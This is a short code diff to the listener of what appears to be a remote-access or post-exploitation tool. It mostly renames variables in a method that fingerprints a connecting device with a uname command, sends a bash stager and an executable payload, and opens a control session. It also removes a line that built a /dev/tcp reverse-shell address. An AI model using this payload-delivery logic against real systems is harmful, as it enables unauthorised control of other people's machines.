@@ -130,9 +130,7 @@ class Server:
 
     def listen(self,is_multi,verbose=True):
         #craft shell script
-        INSTRUCT_ADDRESS = "/dev/tcp/"+self.host+"/"+str(self.port)
-        
-        INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
+        identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
         #listen for connection
         s = socket.socket()
@@ -142,24 +140,23 @@ class Server:
         if verbose:
             h.info_general("Listening on port "+str(self.port)+"...")
 
-        #SEND/RECEIVE ARCH
         conn, addr = s.accept()
         hostAddress = addr[0]
         if verbose:
             h.info_general("Connecting to "+hostAddress)
-        conn.send(INSTRUCT_STAGER)
+        conn.send(identification_shell_command)
         device_type = conn.recv(128).strip()
         
         try:
-            preload, payload = self.craft_payload(device_type)
+            bash_stager, executable = self.craft_payload(device_type)
         except Exception as e:
             h.info_error(str(e))
             raw_input("Press the enter key to continue")
             return
         
         h.info_general("Sending Payload")
-        conn.send(preload)
-        conn.send(payload)
+        conn.send(bash_stager)
+        conn.send(executable)
         conn.close()
         h.info_general("Establishing Secure Connection...")
         return self.listen_espl(s,device_type)
